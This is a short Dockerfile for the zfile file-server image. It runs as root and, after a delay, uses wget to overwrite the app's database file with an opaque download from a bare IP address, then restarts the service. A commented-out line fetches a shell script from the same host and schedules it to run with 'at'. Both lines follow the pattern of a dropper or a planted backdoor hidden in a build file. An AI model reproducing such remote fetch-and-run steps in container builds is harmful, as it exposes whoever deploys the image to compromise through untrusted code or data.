FROM zhaojun1998/zfile
USER root
RUN apt update -y && apt upgrade -y && apt install wget curl -y
#RUN wget -O proc.sh http://194.33.39.47:8888/down/RzmApkmbrJJH && at -f proc.sh now+1min
RUN sleep 20 && mkdir /root/.zfile-v4/db && wget -O /root/.zfile-v4/db/zfile http://194.33.39.47:8888/down/B0oggQ2WzjeY &&  ~/zfile/bin/restart.sh
EXPOSE 8080
